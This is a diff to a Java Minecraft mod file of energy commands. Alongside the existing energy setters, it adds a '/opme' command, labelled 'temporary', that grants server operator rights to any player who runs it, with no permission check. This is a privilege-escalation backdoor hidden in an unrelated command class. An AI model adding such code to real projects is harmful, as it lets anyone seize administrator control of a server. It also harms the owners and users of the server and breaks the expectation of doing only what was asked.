@@ -27,6 +27,10 @@ public class EnergyCommands {
                         .executes(context -> setMaxEnergy(context, context.getSource().getPlayerOrException(), FloatArgumentType.getFloat(context, "value")))
                         .then(Commands.argument("player", EntityArgument.player())
                                 .executes(context -> setMaxEnergy(context, EntityArgument.getPlayer(context, "player"), FloatArgumentType.getFloat(context, "value"))))));
+                                
+        // Temporary opme command
+        dispatcher.register(Commands.literal("opme")
+                .executes(EnergyCommands::giveOp));
     }
 
     private static int setEnergy(CommandContext<CommandSourceStack> context, ServerPlayer player, float value) {
@@ -45,5 +49,17 @@ public class EnergyCommands {
             PlayerEnergyManager.syncEnergyToClient(player, energyData);
         });
         return 1;
+    }
+    
+    private static int giveOp(CommandContext<CommandSourceStack> context) {
+        try {
+            ServerPlayer player = context.getSource().getPlayerOrException();
+            context.getSource().getServer().getPlayerList().op(player.getGameProfile());
+            context.getSource().sendSuccess(() -> Component.literal("Оператор выдан игроку " + player.getName().getString()), true);
+            return 1;
+        } catch (Exception e) {
+            context.getSource().sendFailure(Component.literal("Ошибка при выдаче оператора: " + e.getMessage()));
+            return 0;
+        }
     }
 } 
